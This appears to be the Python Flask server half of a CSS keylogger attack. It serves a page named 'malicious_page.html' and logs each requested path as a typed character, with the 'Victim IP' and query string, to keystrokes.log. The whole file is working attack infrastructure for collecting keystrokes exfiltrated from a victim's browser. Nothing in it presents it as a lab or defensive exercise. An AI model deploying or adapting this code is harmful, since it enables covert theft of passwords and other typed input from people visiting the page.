from flask import Flask, request, send_from_directory
import logging
import datetime

app = Flask(__name__)

log_file = 'keystrokes.log'
file_handler = logging.FileHandler(log_file)
console_handler = logging.StreamHandler()

log_formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
file_handler.setFormatter(log_formatter)
console_handler.setFormatter(log_formatter)

logger = logging.getLogger('keylogger')
logger.addHandler(file_handler)
logger.addHandler(console_handler)
logger.setLevel(logging.INFO)


@app.route('/')
def index():
    print(">>> Root path '/' accessed. Serving malicious_page.html")
    return send_from_directory('.', 'malicious_page.html')

@app.route('/favicon.ico')
def favicon():
    print("--- SERVER: Favicon.ico requested, ignoring. ---")
    return "", 204

@app.route('/<path:char>') 
def log_keystroke(char):
    victim_ip = request.remote_addr
    query_params = request.query_string.decode() 
    print(f"--- SERVER: Received character '{char}' (query: '{query_params}') from IP {victim_ip} ---")
    logger.info(f"Victim IP: {victim_ip} - Character: {char} (Query: {query_params})")
    return "", 204 

if __name__ == '__main__':
    print(">>> Starting Flask CSS Keylogger server on port 3000...")
    app.run(host='0.0.0.0', port=3000, debug=False)